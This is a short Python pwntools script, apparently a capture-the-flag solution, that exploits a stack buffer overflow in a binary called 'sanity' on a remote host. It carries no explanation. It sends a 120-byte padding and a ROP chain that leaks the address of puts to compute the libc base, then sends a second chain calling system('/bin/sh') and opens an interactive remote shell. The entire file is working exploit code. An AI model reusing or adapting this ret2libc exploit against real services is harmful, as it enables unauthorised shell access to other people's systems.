from pwn import *

os.environ['LD_PRELOAD'] = './libc-2.23.so'

#r = process('./sanity')
r = remote('35.185.151.73', 8044)
e = ELF('./sanity')
libc = ELF('./libc-2.23.so')

prdi = 0x00000000004006a3# : pop rdi ; ret
raw_input('>>')

def packAll(rop):
    return flat([p64(x) for x in rop])
rop = []
rop += [prdi, e.got['puts']]
rop += [e.plt['puts']]
rop += [e.symbols['main']]
payload = 'A'*120+packAll(rop)
r.clean()
r.sendline(payload)
puts = u64(r.recv(6)+'\x00\x00')
libc_base = puts - libc.symbols['puts']
log.info('libc base is %#x' % libc_base)

system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh\x00').next()

rop = []
rop += [prdi, sh]
rop += [system]
payload = 'A'*120+packAll(rop)
r.clean()
r.sendline(payload)
r.interactive()
